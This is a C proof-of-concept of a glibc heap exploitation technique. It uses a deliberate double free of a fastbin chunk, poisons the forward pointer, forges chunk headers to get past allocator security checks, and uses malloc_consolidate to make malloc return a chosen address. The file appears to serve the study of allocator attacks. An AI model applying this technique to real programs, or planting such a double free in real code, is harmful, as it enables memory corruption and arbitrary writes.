#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdio.h>

#include "malloc-lib.h"

intptr_t target;

int main() {
  int fsz = 8;
  int sz = 0x100;
  int lsz = 0x1000;
  void* dst = &target;

  // [PRE-CONDITION]
  //    fsz: any fastbin size
  //    sz: any non-fastbin size
  //    lsz: any largebin size
  // [BUG] write free memory p1
  // [POST-CONDITION]
  //    malloc(sz) = fake - offsetof(struct malloc_chunk, fd)
  void* p1 = malloc(fsz);
  void* p2 = malloc(fsz);
  void* p3 = malloc(fsz);

  free(p1);
  free(p2);

  // [BUG] double free p1
  free(p1);

  // p4 is same with p1, but p1 is still in a fast bin freelist
  void* p4 = malloc(fsz);
  void* p5 = malloc(fsz);

  // create a fake chunk
  struct malloc_chunk *fake = dst;
  // set P=1 to avoid a security check
  fake->size = chunk_size(sz) | 1;
  fake->fd = NULL;

  // create 'fake2': a next chunk of 'fake'
  struct malloc_chunk *fake2 = dst + chunk_size(sz);
  // set P=1 to avoid a security check
  fake2->size = 1;

  struct malloc_chunk *c4 = raw_to_chunk(p4);
  // set a forward pointer of fast bin into fake
  // this can be done by a normal heap write since p4 is allocated
  c4->fd = fake;

  // now a fast bin list: c1 -> fake
  // call malloc_consolidate to move
  // 'fake' to the unsorted bin
  malloc(lsz);

  assert(raw_to_chunk(malloc(sz)) == fake);
}
